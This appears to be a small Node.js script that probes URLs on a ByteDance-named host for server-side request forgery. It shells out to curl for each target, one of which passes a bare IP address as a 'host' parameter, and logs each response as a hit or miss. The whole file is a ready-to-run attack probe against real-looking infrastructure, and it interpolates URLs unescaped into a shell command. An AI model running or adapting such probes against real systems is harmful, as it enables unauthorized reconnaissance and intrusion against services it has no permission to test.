const { execSync } = require('child_process');

const TARGETS = [
  'https://src-ssrf.bytedance.net/ssrf',
  'https://src-ssrf.bytedance.net/ssrf?host=101.35.44.248',
];

for (const url of TARGETS) {
  try {
    const r = execSync(
      `curl -s --connect-timeout 5 "${url}" 2>/dev/null`,
      { timeout: 8000 }
    ).toString().trim();
    console.log(`[HIT] ${url} -> ${r.slice(0, 500)}`);
  } catch (e) {
    console.log(`[MISS] ${url} -> ${e.message}`);
  }
}
